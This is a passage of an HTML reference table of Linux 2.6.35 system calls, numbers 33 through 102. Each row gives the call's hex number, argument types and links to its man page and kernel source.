<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>33</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/access.2.html" target="_blank" rel="external">sys_access</a></td>
<td>0x21</td>
<td>const char __user *filename</td>
<td>int mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L356" target="_blank" rel="external">fs/open.c:356</a></td>
</tr>
<tr>
<td>34</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nice.2.html" target="_blank" rel="external">sys_nice</a></td>
<td>0x22</td>
<td>int increment</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4282" target="_blank" rel="external">kernel/sched.c:4282</a></td>
</tr>
<tr>
<td>35</td>
<td>not implemented</td>
<td>0x23</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>36</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync.2.html" target="_blank" rel="external">sys_sync</a></td>
<td>0x24</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L98" target="_blank" rel="external">fs/sync.c:98</a></td>
</tr>
<tr>
<td>37</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html" target="_blank" rel="external">sys_kill</a></td>
<td>0x25</td>
<td>int pid</td>
<td>int sig</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2317" target="_blank" rel="external">kernel/signal.c:2317</a></td>
</tr>
<tr>
<td>38</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rename.2.html" target="_blank" rel="external">sys_rename</a></td>
<td>0x26</td>
<td>const char __user *oldname</td>
<td>const char __user *newname</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2765" target="_blank" rel="external">fs/namei.c:2765</a></td>
</tr>
<tr>
<td>39</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html" target="_blank" rel="external">sys_mkdir</a></td>
<td>0x27</td>
<td>const char __user *pathname</td>
<td>int mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2130" target="_blank" rel="external">fs/namei.c:2130</a></td>
</tr>
<tr>
<td>40</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rmdir.2.html" target="_blank" rel="external">sys_rmdir</a></td>
<td>0x28</td>
<td>const char __user *pathname</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2244" target="_blank" rel="external">fs/namei.c:2244</a></td>
</tr>
<tr>
<td>41</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup.2.html" target="_blank" rel="external">sys_dup</a></td>
<td>0x29</td>
<td>unsigned int fildes</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L131" target="_blank" rel="external">fs/fcntl.c:131</a></td>
</tr>
<tr>
<td>42</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe.2.html" target="_blank" rel="external">sys_pipe</a></td>
<td>0x2a</td>
<td>int __user *fildes</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/pipe.c?v=2.6.35#L1117" target="_blank" rel="external">fs/pipe.c:1117</a></td>
</tr>
<tr>
<td>43</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/times.2.html" target="_blank" rel="external">sys_times</a></td>
<td>0x2b</td>
<td>struct tms __user *tbuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L896" target="_blank" rel="external">kernel/sys.c:896</a></td>
</tr>
<tr>
<td>44</td>
<td>not implemented</td>
<td>0x2c</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>45</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/brk.2.html" target="_blank" rel="external">sys_brk</a></td>
<td>0x2d</td>
<td>unsigned long brk</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L245" target="_blank" rel="external">mm/mmap.c:245</a></td>
</tr>
<tr>
<td>46</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgid16.2.html" target="_blank" rel="external">sys_setgid16</a></td>
<td>0x2e</td>
<td>old_gid_t gid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L51" target="_blank" rel="external">kernel/uid16.c:51</a></td>
</tr>
<tr>
<td>47</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgid16.2.html" target="_blank" rel="external">sys_getgid16</a></td>
<td>0x2f</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L222" target="_blank" rel="external">kernel/uid16.c:222</a></td>
</tr>
<tr>
<td>48</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signal.2.html" target="_blank" rel="external">sys_signal</a></td>
<td>0x30</td>
<td>int sig</td>
<td>__sighandler_t handler</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2683" target="_blank" rel="external">kernel/signal.c:2683</a></td>
</tr>
<tr>
<td>49</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/geteuid16.2.html" target="_blank" rel="external">sys_geteuid16</a></td>
<td>0x31</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L217" target="_blank" rel="external">kernel/uid16.c:217</a></td>
</tr>
<tr>
<td>50</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getegid16.2.html" target="_blank" rel="external">sys_getegid16</a></td>
<td>0x32</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L227" target="_blank" rel="external">kernel/uid16.c:227</a></td>
</tr>
<tr>
<td>51</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/acct.2.html" target="_blank" rel="external">sys_acct</a></td>
<td>0x33</td>
<td>const char __user *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/acct.c?v=2.6.35#L274" target="_blank" rel="external">kernel/acct.c:274</a></td>
</tr>
<tr>
<td>52</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umount.2.html" target="_blank" rel="external">sys_umount</a></td>
<td>0x34</td>
<td>char __user *name</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L1132" target="_blank" rel="external">fs/namespace.c:1132</a></td>
</tr>
<tr>
<td>53</td>
<td>not implemented</td>
<td>0x35</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>54</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioctl.2.html" target="_blank" rel="external">sys_ioctl</a></td>
<td>0x36</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>unsigned long arg</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/ioctl.c?v=2.6.35#L613" target="_blank" rel="external">fs/ioctl.c:613</a></td>
</tr>
<tr>
<td>55</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fcntl.2.html" target="_blank" rel="external">sys_fcntl</a></td>
<td>0x37</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>unsigned long arg</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L429" target="_blank" rel="external">fs/fcntl.c:429</a></td>
</tr>
<tr>
<td>56</td>
<td>not implemented</td>
<td>0x38</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>57</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpgid.2.html" target="_blank" rel="external">sys_setpgid</a></td>
<td>0x39</td>
<td>pid_t pid</td>
<td>pid_t pgid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L921" target="_blank" rel="external">kernel/sys.c:921</a></td>
</tr>
<tr>
<td>58</td>
<td>not implemented</td>
<td>0x3a</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>59</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/olduname.2.html" target="_blank" rel="external">sys_olduname</a></td>
<td>0x3b</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L6" target="_blank" rel="external">struct oldold_utsname __user *</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1132" target="_blank" rel="external">kernel/sys.c:1132</a></td>
</tr>
<tr>
<td>60</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umask.2.html" target="_blank" rel="external">sys_umask</a></td>
<td>0x3c</td>
<td>int mask</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1460" target="_blank" rel="external">kernel/sys.c:1460</a></td>
</tr>
<tr>
<td>61</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chroot.2.html" target="_blank" rel="external">sys_chroot</a></td>
<td>0x3d</td>
<td>const char __user *filename</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L408" target="_blank" rel="external">fs/open.c:408</a></td>
</tr>
<tr>
<td>62</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ustat.2.html" target="_blank" rel="external">sys_ustat</a></td>
<td>0x3e</td>
<td>unsigned dev</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/types.h?v=2.6.35#L200" target="_blank" rel="external">struct ustat __user *ubuf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L175" target="_blank" rel="external">fs/statfs.c:175</a></td>
</tr>
<tr>
<td>63</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup2.2.html" target="_blank" rel="external">sys_dup2</a></td>
<td>0x3f</td>
<td>unsigned int oldfd</td>
<td>unsigned int newfd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L116" target="_blank" rel="external">fs/fcntl.c:116</a></td>
</tr>
<tr>
<td>64</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getppid.2.html" target="_blank" rel="external">sys_getppid</a></td>
<td>0x40</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1348" target="_blank" rel="external">kernel/timer.c:1348</a></td>
</tr>
<tr>
<td>65</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgrp.2.html" target="_blank" rel="external">sys_getpgrp</a></td>
<td>0x41</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1020" target="_blank" rel="external">kernel/sys.c:1020</a></td>
</tr>
<tr>
<td>66</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setsid.2.html" target="_blank" rel="external">sys_setsid</a></td>
<td>0x42</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1055" target="_blank" rel="external">kernel/sys.c:1055</a></td>
</tr>
<tr>
<td>67</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaction.2.html" target="_blank" rel="external">sys_sigaction</a></td>
<td>0x43</td>
<td>int sig</td>
<td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/signal.h?v=2.6.35#L117" target="_blank" rel="external">const struct old_sigaction __user *act</a></td>
<td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/signal.h?v=2.6.35#L117" target="_blank" rel="external">struct old_sigaction __user *oact</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/mips/kernel/signal.c?v=2.6.35#L300" target="_blank" rel="external">arch/mips/kernel/signal.c:300</a></td>
</tr>
<tr>
<td>68</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sgetmask.2.html" target="_blank" rel="external">sys_sgetmask</a></td>
<td>0x44</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2657" target="_blank" rel="external">kernel/signal.c:2657</a></td>
</tr>
<tr>
<td>69</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ssetmask.2.html" target="_blank" rel="external">sys_ssetmask</a></td>
<td>0x45</td>
<td>int newmask</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2663" target="_blank" rel="external">kernel/signal.c:2663</a></td>
</tr>
<tr>
<td>70</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setreuid16.2.html" target="_blank" rel="external">sys_setreuid16</a></td>
<td>0x46</td>
<td>old_uid_t ruid</td>
<td>old_uid_t euid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L59" target="_blank" rel="external">kernel/uid16.c:59</a></td>
</tr>
<tr>
<td>71</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setregid16.2.html" target="_blank" rel="external">sys_setregid16</a></td>
<td>0x47</td>
<td>old_gid_t rgid</td>
<td>old_gid_t egid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L43" target="_blank" rel="external">kernel/uid16.c:43</a></td>
</tr>
<tr>
<td>72</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigsuspend.2.html" target="_blank" rel="external">sys_sigsuspend</a></td>
<td>0x48</td>
<td>int history0</td>
<td>int history1</td>
<td>old_sigset_t mask</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/s390/kernel/signal.c?v=2.6.35#L58" target="_blank" rel="external">arch/s390/kernel/signal.c:58</a></td>
</tr>
<tr>
<td>73</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigpending.2.html" target="_blank" rel="external">sys_sigpending</a></td>
<td>0x49</td>
<td>old_sigset_t __user *set</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2562" target="_blank" rel="external">kernel/signal.c:2562</a></td>
</tr>
<tr>
<td>74</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sethostname.2.html" target="_blank" rel="external">sys_sethostname</a></td>
<td>0x4a</td>
<td>char __user *name</td>
<td>int len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1165" target="_blank" rel="external">kernel/sys.c:1165</a></td>
</tr>
<tr>
<td>75</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setrlimit.2.html" target="_blank" rel="external">sys_setrlimit</a></td>
<td>0x4b</td>
<td>unsigned int resource</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41" target="_blank" rel="external">struct rlimit __user *rlim</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1275" target="_blank" rel="external">kernel/sys.c:1275</a></td>
</tr>
<tr>
<td>76</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_getrlimit.2.html" target="_blank" rel="external">sys_old_getrlimit</a></td>
<td>0x4c</td>
<td>unsigned int resource</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41" target="_blank" rel="external">struct rlimit __user *rlim</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1256" target="_blank" rel="external">kernel/sys.c:1256</a></td>
</tr>
<tr>
<td>77</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrusage.2.html" target="_blank" rel="external">sys_getrusage</a></td>
<td>0x4d</td>
<td>int who</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22" target="_blank" rel="external">struct rusage __user *ru</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1452" target="_blank" rel="external">kernel/sys.c:1452</a></td>
</tr>
<tr>
<td>78</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettimeofday.2.html" target="_blank" rel="external">sys_gettimeofday</a></td>
<td>0x4e</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="external">struct timeval __user *tv</a></td>
<td>struct timezone __user *tz</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L101" target="_blank" rel="external">kernel/time.c:101</a></td>
</tr>
<tr>
<td>79</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/settimeofday.2.html" target="_blank" rel="external">sys_settimeofday</a></td>
<td>0x4f</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="external">struct timeval __user *tv</a></td>
<td>struct timezone __user *tz</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L185" target="_blank" rel="external">kernel/time.c:185</a></td>
</tr>
<tr>
<td>80</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgroups16.2.html" target="_blank" rel="external">sys_getgroups16</a></td>
<td>0x50</td>
<td>int gidsetsize</td>
<td>old_gid_t __user *grouplist</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L164" target="_blank" rel="external">kernel/uid16.c:164</a></td>
</tr>
<tr>
<td>81</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgroups16.2.html" target="_blank" rel="external">sys_setgroups16</a></td>
<td>0x51</td>
<td>int gidsetsize</td>
<td>old_gid_t __user *grouplist</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L187" target="_blank" rel="external">kernel/uid16.c:187</a></td>
</tr>
<tr>
<td>82</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_select.2.html" target="_blank" rel="external">sys_old_select</a></td>
<td>0x52</td>
<td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L695" target="_blank" rel="external">struct sel_arg_struct __user *arg</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L701" target="_blank" rel="external">fs/select.c:701</a></td>
</tr>
<tr>
<td>83</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlink.2.html" target="_blank" rel="external">sys_symlink</a></td>
<td>0x53</td>
<td>const char __user *old</td>
<td>const char __user *new</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2419" target="_blank" rel="external">fs/namei.c:2419</a></td>
</tr>
<tr>
<td>84</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lstat.2.html" target="_blank" rel="external">sys_lstat</a></td>
<td>0x54</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="external">struct <strong>old_kernel_stat </strong>user *statbuf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L162" target="_blank" rel="external">fs/stat.c:162</a></td>
</tr>
<tr>
<td>85</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlink.2.html" target="_blank" rel="external">sys_readlink</a></td>
<td>0x55</td>
<td>const char __user *path</td>
<td>char __user *buf</td>
<td>int bufsiz</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L311" target="_blank" rel="external">fs/stat.c:311</a></td>
</tr>
<tr>
<td>86</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/uselib.2.html" target="_blank" rel="external">sys_uselib</a></td>
<td>0x56</td>
<td>const char __user *library</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/exec.c?v=2.6.35#L107" target="_blank" rel="external">fs/exec.c:107</a></td>
</tr>
<tr>
<td>87</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapon.2.html" target="_blank" rel="external">sys_swapon</a></td>
<td>0x57</td>
<td>const char __user *specialfile</td>
<td>int swap_flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/swapfile.c?v=2.6.35#L1793" target="_blank" rel="external">mm/swapfile.c:1793</a></td>
</tr>
<tr>
<td>88</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/reboot.2.html" target="_blank" rel="external">sys_reboot</a></td>
<td>0x58</td>
<td>int magic1</td>
<td>int magic2</td>
<td>unsigned int cmd</td>
<td>void __user *arg</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L368" target="_blank" rel="external">kernel/sys.c:368</a></td>
</tr>
<tr>
<td>89</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_readdir.2.html" target="_blank" rel="external">sys_old_readdir</a></td>
<td>0x59</td>
<td>unsigned int</td>
<td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L61" target="_blank" rel="external">struct old_linux_dirent __user *</a></td>
<td>unsigned int</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L105" target="_blank" rel="external">fs/readdir.c:105</a></td>
</tr>
<tr>
<td>90</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_mmap.2.html" target="_blank" rel="external">sys_old_mmap</a></td>
<td>0x5a</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1132" target="_blank" rel="external">struct mmap_arg_struct __user *arg</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1141" target="_blank" rel="external">mm/mmap.c:1141</a></td>
</tr>
<tr>
<td>91</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munmap.2.html" target="_blank" rel="external">sys_munmap</a></td>
<td>0x5b</td>
<td>unsigned long addr</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L2109" target="_blank" rel="external">mm/mmap.c:2109</a></td>
</tr>
<tr>
<td>92</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/truncate.2.html" target="_blank" rel="external">sys_truncate</a></td>
<td>0x5c</td>
<td>const char __user *path</td>
<td>long length</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L127" target="_blank" rel="external">fs/open.c:127</a></td>
</tr>
<tr>
<td>93</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ftruncate.2.html" target="_blank" rel="external">sys_ftruncate</a></td>
<td>0x5d</td>
<td>unsigned int fd</td>
<td>unsigned long length</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L178" target="_blank" rel="external">fs/open.c:178</a></td>
</tr>
<tr>
<td>94</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmod.2.html" target="_blank" rel="external">sys_fchmod</a></td>
<td>0x5e</td>
<td>unsigned int fd</td>
<td>mode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L436" target="_blank" rel="external">fs/open.c:436</a></td>
</tr>
<tr>
<td>95</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchown16.2.html" target="_blank" rel="external">sys_fchown16</a></td>
<td>0x5f</td>
<td>unsigned int fd</td>
<td>old_uid_t user</td>
<td>old_gid_t group</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L35" target="_blank" rel="external">kernel/uid16.c:35</a></td>
</tr>
<tr>
<td>96</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpriority.2.html" target="_blank" rel="external">sys_getpriority</a></td>
<td>0x60</td>
<td>int which</td>
<td>int who</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L216" target="_blank" rel="external">kernel/sys.c:216</a></td>
</tr>
<tr>
<td>97</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpriority.2.html" target="_blank" rel="external">sys_setpriority</a></td>
<td>0x61</td>
<td>int which</td>
<td>int who</td>
<td>int niceval</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L149" target="_blank" rel="external">kernel/sys.c:149</a></td>
</tr>
<tr>
<td>98</td>
<td>not implemented</td>
<td>0x62</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>99</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statfs.2.html" target="_blank" rel="external">sys_statfs</a></td>
<td>0x63</td>
<td>const char __user * path</td>
<td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L22" target="_blank" rel="external">struct statfs __user *buf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L102" target="_blank" rel="external">fs/statfs.c:102</a></td>
</tr>
<tr>
<td>100</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatfs.2.html" target="_blank" rel="external">sys_fstatfs</a></td>
<td>0x64</td>
<td>unsigned int fd</td>
<td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L22" target="_blank" rel="external">struct statfs __user *buf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L136" target="_blank" rel="external">fs/statfs.c:136</a></td>
</tr>
<tr>
<td>101</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioperm.2.html" target="_blank" rel="external">sys_ioperm</a></td>
<td>0x65</td>
<td>unsigned long</td>
<td>unsigned long</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>102</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/socketcall.2.html" target="_blank" rel="external">sys_socketcall</a></td>
<td>0x66</td>
<td>int call</td>
<td>unsigned long __user *args</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210" target="_blank" rel="external">net/socket.c:2210</a></td>
</tr>
<tr>
<td>103</td>
